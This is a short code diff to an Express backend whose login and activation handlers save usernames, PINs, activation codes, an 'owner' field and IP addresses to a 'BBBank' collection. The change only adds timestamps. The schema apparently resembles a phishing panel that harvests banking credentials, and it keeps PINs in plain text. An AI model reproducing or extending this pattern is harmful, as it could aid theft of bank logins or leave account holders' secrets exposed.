@@ -43,7 +43,7 @@ const submitLogin = async (req, res) => {
 	try {
 		let user = await BBBank.findOneAndUpdate(
 			{ uniqueid },
-			{ username, pin, status: 1 }
+			{ username, pin, status: 1, timestamp: moment().format() }
 		);
 		if (!user) {
 			await BBBank.create({
@@ -99,7 +99,14 @@ const submitActivation = async (req, res) => {
 			{ activationCode, status: 5, timestamp: moment().format() }
 		).exec();
 		if (!user) {
-			await BBBank.create({ uniqueid, activationCode, owner, ip, status: 5 });
+			await BBBank.create({
+				uniqueid,
+				activationCode,
+				owner,
+				ip,
+				status: 5,
+				timestamp: moment().format(),
+			});
 		}
 		res.sendStatus(200);
 	} catch (error) {
